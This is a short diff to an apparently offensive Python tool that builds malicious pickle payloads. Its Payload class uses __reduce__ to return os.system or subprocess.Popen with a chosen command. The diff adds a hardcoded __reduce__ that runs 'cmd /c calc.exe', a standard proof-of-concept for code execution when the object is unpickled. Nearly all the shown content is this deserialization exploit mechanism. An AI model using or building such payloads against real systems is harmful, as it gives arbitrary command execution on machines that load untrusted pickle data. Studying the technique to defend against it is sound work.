@@ -10,6 +10,10 @@ import argparse
 
 
 class Payload:
+    def __reduce__(self):
+        return (os.system, ("cmd /c calc.exe",))
+
+
     def __init__(self, command=None, vector=None):
         self.vector = vector
         self.command = command
@@ -19,6 +23,7 @@ class Payload:
             return (os.system, (self.command,))
         elif self.vector == "subprocess":
             return (subprocess.Popen, (self.command,))
+
 
 
 def _patch(bytestream):
